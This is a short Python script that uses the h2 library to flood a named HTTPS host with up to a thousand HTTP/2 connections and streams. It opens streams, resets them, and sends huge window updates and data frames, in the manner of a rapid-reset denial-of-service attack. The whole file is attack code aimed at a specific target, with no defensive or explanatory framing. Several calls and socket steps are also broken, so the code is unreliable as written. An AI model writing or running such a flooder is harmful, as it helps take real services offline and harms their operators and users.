import asyncio
import random
import socket
import ssl
import time

from hyperframe.frame import SettingsFrame, WindowUpdateFrame
from hyperframe.frame import DataFrame
from h2.connection import H2Connection
from h2.events import WindowUpdated, DataReceived, StreamEnded
from h2.exceptions import ProtocolError

TARGET = 'https://file.cunhua.today'
CONNECTIONS = 1000
STREAMS = 1000
DATA = b'Hello, world'

connections = set()
streams = set()

async def connect():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        await asyncio.sleep(random.random())
        try:
            await loop.sock_connect(sock, (TARGET, 443))
        except (BlockingIOError, ConnectionRefusedError):
            continue

        conn = H2Connection(client_side=True)
        conn.initiate_connection()
        sock.send(conn.data_to_send())

        try:
            await loop.sock_sendall(sock, conn.data_to_send())
        except ConnectionError:
            continue

        connections.add(sock)

async def send_data(sock, data):
    while True:
        await asyncio.sleep(0.5 + random.random() * 2)
        try:
            await loop.sock_sendall(sock, data)
        except ConnectionError:
            return

async def send_streams():
    while True:
        await asyncio.sleep(0.5 + random.random() * 2)
        for conn in connections:
            if len(streams) > 1000:
                return
            stream_id = conn.local_closed_stream_id
            if stream_id is not None and stream_id in streams:
                continue

            try:
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, {})
                conn.send_data(stream_id, DATA, end_stream=False)
                streams.add(stream_id)
            except ProtocolError:
                return

async def send_rst_streams():
    while True:
        await asyncio.sleep(0.5 + random.random() * 2)
        for conn in connections:
            if len(streams) < 1000:
                return
            stream_id = conn.local_closed_stream_id
            if stream_id is None or stream_id not in streams:
                continue
            conn.reset_stream(stream_id)

async def send_window_updates():
    while True:
        await asyncio.sleep(0.5 + random.random() * 2)
        for conn in connections:
            conn.update_initial_window_size(2**60)
            conn.update_stream_window_size(0, 2**60)

async def send_data_frames():
    while True:
        await asyncio.sleep(0.5 + random.random() * 2)
        for conn in connections:
            if len(streams) < 1000:
                return
            stream_id = conn.local_closed_stream_id
            if stream_id is None or stream_id not in streams:
                continue
            conn.send_data(stream_id, DATA, end_stream=False)

async def monitor():
    while True:
        await asyncio.sleep(1)
        print('Connections: %d, Streams: %d' % (len(connections), len(streams)))

loop = asyncio.get_event_loop()
loop.create_task(connect())
loop.create_task(send_streams())
loop.create_task(send_rst_streams())
loop.create_task(send_window_updates())
loop.create_task(send_data_frames())
loop.create_task(monitor())
loop.run_forever()
